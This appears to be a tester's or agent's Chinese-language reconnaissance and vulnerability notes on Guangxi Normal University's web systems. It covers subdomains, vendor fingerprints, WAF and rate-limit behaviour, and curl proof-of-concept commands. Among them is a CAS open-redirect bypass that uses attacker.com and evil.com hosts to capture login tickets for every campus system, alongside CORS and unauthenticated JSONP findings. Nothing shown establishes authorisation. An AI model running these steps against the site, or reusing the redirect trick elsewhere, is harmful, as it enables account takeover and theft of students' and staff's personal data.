# gxnu.edu.cn 广西师范大学 测试模式 (2026-06-09)

## 目标概况

- 域名: gxnu.edu.cn
- 地址: 广西壮族自治区桂林市七星区育才路15号
- 子域数量: 108 (subfinder)
- 网络: CERNET教育网, src-fast-assess.py 120s超时

## 技术栈

| 子域 | 系统 | 技术栈 |
|------|------|--------|
| sso.gxnu.edu.cn | 统一身份认证CAS | 自定义CAS (非金智), nginx, CORS *+creds |
| ehall.gxnu.edu.cn | 网上办事大厅 | 金智教育(wisedu), schoolId=10602, Tomcat/7.0.81, Spring, Redis |
| webvpn.gxnu.edu.cn | WebVPN | _astraeus_session cookie, Rails风格 |
| mail.gxnu.edu.cn | 邮箱 | 网易企业邮箱(qiye.163.com) |
| office.gxnu.edu.cn | 校长办公室 | SUDY CMS站群 (siteId=21) |
| hr.gxnu.edu.cn | 人事处 | SUDY CMS站群 (siteId=30) |
| ydjk.gxnu.edu.cn | 一卡通/能源管理 | ECMS, 智慧预付费管控系统 v3.1.0 |
| dms.gxnu.edu.cn | 学工平台 | Angular SPA |
| aieval.gxnu.edu.cn | AI测评系统 | Vue SPA |
| rczp.gxnu.edu.cn | 招聘 | Apache Tomcat/7.0.100 (默认页暴露) |
| idp.gxnu.edu.cn | Shibboleth IdP | SAML元数据泄露 |

## 供应商指纹

### CAS (sso.gxnu.edu.cn)
- **非金智教育CAS** — 无 wisedu/encrypt.js/pwdDefaultEncryptSalt 特征
- 登录页: /cas/login (POST)
- JS: security.js, pwdYz.js, login.js
- 支持: 用户名密码 + 微信扫码 + 动态口令
- 微信AppID: wxe52de1e60e5ce45e
- 回调: http://sso.gxnu.edu.cn/cas/login/cas?client_name=WeiXinClient
- Server: nginx
- 重定向: / → 301 → /cas
- execution参数: UUID + Base64编码动态token
- 速率限制: {"error":"too_many_requests","message":"请求过于频繁，请稍后再试"}
- CAS serviceValidate: 验证service白名单, 未注册域名返回UNAUTHORIZED_SERVICE
- 已注册service域名: ehall/mail/office/hr/webvpn/ydjk (均接受)
- 未注册service域名: www.gxnu.edu.cn (返回"未认证授权服务")

### ehall (ehall.gxnu.edu.cn)
- 金智教育平台确认 (school.json: "Ehall of Wisedu University")
- schoolId: 10602
- authserverUrl: http://authlab.wisedu.com/authserver/index.do (外部, 不可达)
- 重定向: / → 301 → /new/index.html
- 后端: Tomcat/7.0.81 + Spring Framework + Redis (RedisServiceImpl)
- 认证: /amp-auth-adapter/login → sessionToken(32位hex) → CAS → /amp-auth-adapter/loginSuccess
- JSONP路径: /jsonp/ (公开), /publicapp/ (需CAS认证)

### SUDY CMS (office/hr等)
- 特征: sudyNavi, jquery.sudy.wp.visitcount.js, sudy-wp-siteId
- 管理后台: /_wp3services/general498/index.jsp (302→CAS), /system/_csair/main.psp (IP白名单)
- 管理后台IP验证: 返回用户IP `<input id="ipAddress" value="xxx"/>` + "访问地址不合法(003)"
- 登出API: /_web/_ids/login/api/logout/create.rst (POST)

### WebVPN (webvpn.gxnu.edu.cn)
- _astraeus_session cookie
- Rails风格重定向: / → /users/sign_in
- SERVERID=Server1 cookie

## 已验证漏洞

### [高危] CAS Open Redirect (子域名拼接绕过白名单)
- 端点: /cas/login?service=<恶意URL>
- 白名单逻辑缺陷: 仅检查service参数是否包含合法域名字符串, 而非完整域名验证
- 绕过方式:
  - 子域名拼接: http://ehall.gxnu.edu.cn.attacker.com
  - 用户信息字段: http://ehall.gxnu.edu.cn@evil.com
- PoC: `curl -sk 'https://sso.gxnu.edu.cn/cas/login?service=http://ehall.gxnu.edu.cn.attacker.com' | grep 'action='`
- 预期: action="/cas/login?service=http://ehall.gxnu.edu.cn.attacker.com"
- 对比: http://evil.com → 返回"未认证授权服务"页面
- 利用: 用户登录后CAS Ticket发送到攻击者服务器, 可访问所有CAS保护系统
- 影响: 全校师生账号被盗用, 可获取成绩/课程/个人信息等敏感数据

### [中危] CAS CORS配置不当
- 端点: /cas/login, /cas/logout, /cas/serviceValidate
- 配置: ACAO=* + ACAC=true
- PoC: `curl -sk -D- 'https://sso.gxnu.edu.cn/cas/login' | grep -i access-control`

### [中危] ehall JSONP未授权API访问
- 端点: /jsonp/appInfo.json?appId=xxx, /jsonp/serviceCenterData.json, /jsonp/userInfo.json
- 泄露: 应用配置(部署路径/供应商/版本/认证URL), 站点结构, 角色配置
- appInfo.json泄露: appId=4834312099124186, appName=学工流程管理, vendorName=金智教育, deployPrefix=http://ehall.gxnu.edu.cn/xsfw
- PoC: `curl -sk 'http://ehall.gxnu.edu.cn/jsonp/appInfo.json?appId=4834312099124186'`

### [低危] ehall错误页面堆栈信息泄露
- 端点: /amp-auth-adapter/loginSuccess, /amp-auth-adapter/logout
- 泄露: Apache Tomcat/7.0.81, Spring Framework, Redis (RedisServiceImpl), 金智教育amp平台
- PoC: `curl -sk 'http://ehall.gxnu.edu.cn/amp-auth-adapter/loginSuccess'`

### [低危] Actuator端点暴露 (WAF拦截)
- 4个子域均有 /actuator/health, /actuator/info, /swagger-ui.html
- ehall/office/hr 还有 /druid
- 全部被WAF拦截返回"访问禁止"

## WAF特征

- 拦截页面: "访问禁止", 事件编号格式 202606091460001933
- 拦截范围: Actuator/Druid等敏感路径
- 拦截方式: 返回200 + HTML拦截页 (非403)
- 未拦截: CAS登录页, ehall首页, SUDY CMS页面

## 关键教训

1. **CAS service参数白名单绕过**: 子域名拼接(attacker.com)和用户信息字段(@evil.com)可绕过字符串匹配白名单
2. **ehall JSONP端点无需认证**: /jsonp/appInfo.json等端点可直接访问获取应用配置
3. **不要浪费时间在低价值发现**: 用户明确要求"真正有价值的漏洞", CORS/Actuator/AppID等低危发现不应作为主要报告
4. **CERNET网络慢**: src-fast-assess.py 120s超时, 需手动分步执行
5. **CAS速率限制**: 连续POST请求会触发"too_many_requests"错误
